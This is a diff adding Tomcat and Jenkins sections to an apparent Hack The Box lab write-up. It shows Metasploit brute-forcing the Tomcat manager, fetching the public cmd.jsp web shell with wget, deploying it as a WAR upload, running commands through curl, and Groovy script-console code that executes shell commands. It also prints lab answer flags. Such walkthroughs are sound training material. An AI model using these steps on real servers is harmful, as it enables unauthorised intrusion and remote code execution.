@@ -11,6 +11,11 @@
     4. [Attacking Joomla](#attacking-joomla)
     5. [Drupal - Discovery & Enumeration](#drupal---discovery--enumeration)
     6. [Attacking Drupal](#attacking-drupal)
+3. [Servlet Containers/Software Development](#servlet-containerssoftware-development-1)
+    1. [Tomcat - Discovery & Enumeration](#tomcat---discovery--enumeration)
+    2. [Attacking Tomcat](#attacking-tomcat)
+    3. [Jenkins - Discovery & Enumeration](#jenkins---discovery--enumeration)
+    4. [Attacking Jenkins](#attacking-jenkins)
 
 ## Tools
 ### Application Discovery & Enumeration
@@ -25,6 +30,8 @@
 - [joomla-brute.py](https://github.com/ajnik/joomla-bruteforce/blob/master/joomla-brute.py)
 - [CVE-2019-10945.py](https://raw.githubusercontent.com/dpgg101/CVE-2019-10945/main/CVE-2019-10945.py)
 - [drupalgeddon.py](https://www.exploit-db.com/exploits/34992)
+### Servlet Containers/Software Development
+- [cmd.jsp](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)
 
 ## Setting the Stage
 ### Application Discovery & Enumeration
@@ -283,3 +290,96 @@
     ![alt text](<Assets/Attacking Drupal - 1.png>)
 
     We can see that we have been successful getting shell session. Now, we can read the flag. The answer is `DrUp@l_drUp@l_3veryWh3Re!`.
+
+## Servlet Containers/Software Development
+### Tomcat - Discovery & Enumeration
+#### Challenges
+1. What version of Tomcat is running on the application located at http://web01.inlanefreight.local:8180?
+
+    We can solve this by visiting **/docs** from the default tomcat configuration. By default, **/docs** page will show the version of tomcat.
+
+    ```bash
+    curl -s http://web01.inlanefreight.local:8180/docs/ | grep Tomcat
+    ```
+    The answer is `10.0.10`.
+
+2. What role does the admin user have in the configuration example?
+
+    We can find this by reading `tomcat-users.xml` snipset code in the HTB module. The answer is `admin-gui`.
+
+### Attacking Tomcat
+#### Challenges
+1. Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?
+
+    We can use **metasploit** to bruteforce the username and password.
+
+    ```bash
+    [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set VHOST web01.inlanefreight.local
+    VHOST => web01.inlanefreight.local
+    [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set RPORT 8180
+    RPORT => 8180
+    [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set stop_on_success true
+    stop_on_success => true
+    [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set rhosts 10.129.230.35
+    rhosts => 10.129.230.35
+    [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run
+    ```
+    ![alt text](<Assets/Attacking Tomcat - 1.png>)
+
+    We can see that the valid username is `tomcat`.
+
+2. What is the password?
+
+    Based on the previous bruteforce attack, we can see that the valid password is `root`.
+
+3. Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt
+
+    Because we have the valid username and password, we can try to test it to login to the manager page (`http://web01.inlanefreight.local:8180/manager/html`). I have tried it and it works. So, we can try WAR File Upload to gain RCE. We can prepare the payload.
+
+    ```bash
+    wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+    zip -r backup.war cmd.jsp
+    ```
+    Then, we can upload the backup.war file. 
+
+    ![alt text](<Assets/Attacking Tomcat - 2.png>)
+
+    We can see that the file has been uploaded. Now, we can test it by using curl.
+
+    ```bash
+    curl http://web01.inlanefreight.local:8180/backup/cmd.jsp\?cmd\=id
+    ```
+    ![alt text](<Assets/Attacking Tomcat - 3.png>)
+
+    We can see that id command is work. Now, we can search the flag file. After doing some exploration, the flag file is in `/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt` directory. We can read it by using curl.
+
+    ```bash
+    curl http://web01.inlanefreight.local:8180/backup/cmd.jsp\?cmd\=cat%20/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
+    ```
+    The answer is `t0mcat_rc3_ftw!`.
+    
+### Jenkins - Discovery & Enumeration
+#### Challenges
+1. Log in to the Jenkins instance at http://jenkins.inlanefreight.local:8000. Browse around and submit the version number when you are ready to move on.
+
+    We can login by the given credentials. After doing some exploration, we can find the jenkins version in the **/manage** endpoint.
+
+    ![alt text](<Assets/Jenkins - Discovery & Enumeration - 1.png>)
+
+    The answer is `2.303.1`.
+
+### Attacking Jenkins
+#### Challenges
+1. Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory
+
+    We can solve this by visiting **/script** endpoint to access script console. We can read the flag in there.
+
+    ```groovy
+    def cmd = 'cat /var/lib/jenkins3/flag.txt'
+    def sout = new StringBuffer(), serr = new StringBuffer()
+    def proc = cmd.execute()
+    proc.consumeProcessOutput(sout, serr)
+    proc.waitForOrKill(1000)
+    println sout
+    ```
+    The answer is `f33ling_gr00000vy!`.
